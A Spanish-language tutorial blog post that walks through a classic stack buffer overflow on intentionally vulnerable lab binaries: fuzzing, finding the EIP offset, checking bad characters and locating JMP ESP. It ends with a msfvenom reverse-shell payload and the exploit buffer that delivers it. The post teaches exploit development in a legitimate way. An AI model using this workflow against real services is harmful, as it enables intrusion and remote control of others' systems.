---
title: "Buffer overflow básico: el proceso paso a paso que sigo en un binario vulnerable"
description: "Fuzzing, control de EIP, encontrar el offset con un patrón, y disparar shellcode — el flujo completo de un buffer overflow clásico en un entorno de laboratorio (sin protecciones modernas)."
slug: "buffer-overflow-basico"
category: "Vulnerabilidades"
tags: ["buffer overflow", "explotación de binarios", "fundamentos", "exploit development"]
date: "2026-11-04"
level: "Avanzado"
---

## Por qué esto sigue siendo relevante en 2026

Con ASLR, DEP, stack canaries y demás protecciones activas por defecto en sistemas modernos, un buffer overflow clásico como el que describo aquí ya no funciona directamente contra un binario de producción moderno. Pero entender el mecanismo de fondo — cómo se sobrescribe la pila y se controla el flujo de ejecución — sigue siendo la base sobre la que se entienden técnicas más avanzadas de bypass de esas mismas protecciones. Sin esto primero, lo demás no tiene sentido.

> Esto es exclusivamente para binarios de laboratorio (tipo los de TryHackMe/HTB Academy diseñados para practicar esto, con protecciones desactivadas a propósito) o software propio compilado sin protecciones. Nunca contra software de terceros sin autorización.

## Paso 1: fuzzing para encontrar el crash

Antes de nada, confirmar que el programa efectivamente se cae con una entrada larga:

```python
import socket

buffer = b"A" * 100
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.1.10", 9999))
        s.send(buffer)
        s.close()
        buffer += b"A" * 100
    except:
        print(f"Crash con buffer de tamaño: {len(buffer)}")
        break
```

Este script incrementa el tamaño del buffer hasta que el servicio deja de responder — apuntando a que se produjo un fallo por desbordamiento de algún tipo, aunque todavía no sepamos si es explotable de forma controlada.

## Paso 2: encontrar el offset exacto con un patrón único

En vez de rellenar todo con "A", uso un patrón cíclico único (con `msf-pattern_create` de Metasploit) para saber exactamente en qué posición del buffer se sobrescribe el registro EIP:

```bash
msf-pattern_create -l 500
```

Envío ese patrón en vez de "A"s repetidas, veo en qué valor queda EIP tras el crash (con el programa corriendo bajo un depurador como Immunity Debugger o x64dbg), y luego:

```bash
msf-pattern_offset -l 500 -q <valor_de_EIP>
```

Esto me da el offset exacto — la cantidad de bytes exactos que hay que escribir antes de llegar al punto donde se controla EIP.

## Paso 3: confirmar el control de EIP

Con el offset conocido, envío ese número exacto de "A"s seguido de 4 bytes reconocibles (por ejemplo "BBBB"):

```python
buffer = b"A" * offset + b"B" * 4
```

Si EIP muestra exactamente `42424242` (hex de "BBBB") tras el crash, tengo control confirmado sobre el registro que determina qué se ejecuta a continuación.

## Paso 4: encontrar espacio para el shellcode y comprobar bad characters

Antes de meter shellcode real, hay que comprobar qué caracteres el programa "rompe" al procesarlos (por ejemplo, `\x00` suele terminar cadenas antes de tiempo). Se envía la lista completa de bytes posibles y se compara con lo que llega realmente al buffer en memoria:

```python
badchars = (b"\x01\x02\x03...\xff")
buffer = b"A" * offset + b"B" * 4 + badchars
```

Cualquier byte que no aparezca intacto en memoria tras el envío hay que excluirlo al generar el shellcode final.

## Paso 5: encontrar una dirección de salto válida (JMP ESP)

Con ASLR desactivado (como suele estar en estos laboratorios de práctica), busco una instrucción `JMP ESP` en algún módulo cargado por el programa que no tenga protecciones activas, para usar su dirección como el nuevo valor de EIP — eso redirige la ejecución justo al punto donde colocamos el shellcode:

```bash
# Con mona.py dentro de Immunity Debugger
!mona jmp -r esp -cpb "\x00"
```

## Paso 6: generar el shellcode y montar el exploit final

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<tu-ip> LPORT=4444 -b "\x00" -f python
```

```python
buffer = b"A" * offset
buffer += jmp_esp_address  # en formato little-endian
buffer += b"\x90" * 16  # NOP sled, margen antes del shellcode
buffer += shellcode
```

Con el listener de netcat o Metasploit esperando la conexión, envío este buffer final y, si todo el proceso anterior fue correcto, el programa salta al shellcode y devuelve una shell.

## Lo que este ejercicio te enseña de verdad

No es memorizar el proceso — es entender por qué cada paso es necesario: el offset porque no toda la entrada llega al mismo sitio en memoria, los bad characters porque el programa puede corromper el shellcode al procesarlo, la dirección JMP ESP porque no puedes simplemente apuntar EIP a una dirección de memoria fija con ASLR presente (aunque en este ejercicio esté desactivado). Una vez entiendes esto en un binario simple sin protecciones, las técnicas de bypass de protecciones modernas dejan de parecer magia y empiezan a verse como extensiones lógicas del mismo problema base.